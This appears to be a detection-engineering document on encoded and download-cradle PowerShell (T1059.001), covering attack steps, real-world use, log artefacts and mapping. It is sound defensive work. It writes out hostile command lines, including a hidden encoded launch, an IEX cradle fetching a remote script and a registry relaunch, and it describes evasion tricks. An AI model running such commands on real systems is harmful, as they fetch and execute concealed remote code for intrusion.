# Encoded and download-cradle PowerShell (T1059.001)

## What the attack is
The attacker runs PowerShell with the script passed on the command line
as Base64 (`-EncodedCommand`), or with a one-line "cradle" that
downloads a script and executes it in memory. Either way the payload
never has to touch disk as a file, and anyone reading the command line
sees an opaque blob instead of the script. PowerShell is installed and
signed on every Windows host, so there is nothing to bring along.

## How the attack happens
1. The attacker already has code execution: a macro, a malicious
   shortcut or VBS file, a web shell, a remote service, or an implant.
2. They encode a script as UTF-16LE then Base64, and start
   `powershell.exe -NoP -NonI -W Hidden -Enc <blob>`. PowerShell accepts
   any unambiguous prefix of `-EncodedCommand` (`-e`, `-ec`, `-en`,
   `-enc`, ...), and `/` as well as `-`.
3. Or they start a cradle such as
   `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://host/a.ps1')"`,
   which fetches the next stage and runs it with `Invoke-Expression`.
4. The decoded script usually disables AMSI or logging, then loads a
   stager (Empire, Cobalt Strike, Metasploit, or a ransomware loader).
   In the recorded Empire data used here, a VBS file run by `wscript.exe`
   starts `powershell.exe -noP -sta -w 1 -enc SQBmACgA...`.
5. A common follow-on is to store the blob in the registry and relaunch
   it at logon with `powershell -c "$x=(gp HKCU:...).Debug; powershell -enc $x"`
   (see A2): the outer command line shows `-enc $x`, and only the inner
   process shows the Base64.

## Real-world use
- CISA advisory AA25-071A, "#StopRansomware: Medusa Ransomware"
  (12 March 2025): Medusa actors used "a well-known evasion technique
  that executes a base64 encrypted command", given as
  `powershell -exec bypass -enc <base64 encrypted command string>`.
  The same advisory shows a download cradle built on
  `Invoke-Expression (New-Object Net.WebClient)...`.
- MITRE ATT&CK v20.0 lists 86 groups and 18 campaigns using T1059.001;
  several procedure examples name encoded commands specifically (e.g.
  BlackByte, Aquatic Panda, Play), read from the STIX bundle's
  relationship descriptions on 2026-10-27. Those are MITRE's summaries,
  not reports fetched for this doc.

## What it leaves in the logs
- Security 4688 (process creation), when "Include command line in
  process creation events" is on: `NewProcessName` ends in
  `powershell.exe` or `pwsh.exe`, `CommandLine` holds the switch and the
  blob, `ParentProcessName` shows the launcher (`wscript.exe`,
  `winword.exe`, `w3wp.exe`, `wmiprvse.exe`, `services.exe`).
- Sysmon event 1 carries the same plus `OriginalFileName`, which
  survives renaming `powershell.exe`.
- PowerShell 4104 (script block logging) records the decoded script;
  this rule does not read it.
- What the attacker controls: they can rename or copy `powershell.exe`
  (4688 then shows the new name), call PowerShell through
  `System.Management.Automation` from another process (no
  `powershell.exe` at all), or keep the blob in a variable or file so
  the command line never contains it.

## Prerequisites
Code execution as any user; no privileges needed. Usually provided by
initial access (T1566 phishing attachment, T1190 exploited web app) or
by another execution technique such as a script host (T1059.005 VBS).

## Mapping
T1059.001 Command and Scripting Interpreter: PowerShell, tactic
execution. Not T1027 (Obfuscated Files or Information) as the primary
mapping: Base64 here is a transport for the command line, and the rule
fires on PowerShell execution with that transport. T1027.010 (Command
Obfuscation) is a reasonable secondary mapping but is left out so
coverage is not counted twice for one behaviour.

## References
- CISA, "#StopRansomware: Medusa Ransomware", AA25-071A, 12 March 2025,
  https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a
  (fetched 2026-10-27).
- MITRE ATT&CK T1059.001, https://attack.mitre.org/techniques/T1059/001/;
  procedure examples read from the enterprise-attack STIX bundle v20.0,
  https://github.com/mitre-attack/attack-stix-data (fetched 2026-10-27).
- OTRF Security-Datasets, empire_launcher_vbs and
  empire_persistence_registry_modification_run_keys_standard_user,
  commit d9d40ef, https://github.com/OTRF/Security-Datasets (fetched
  2026-10-27).
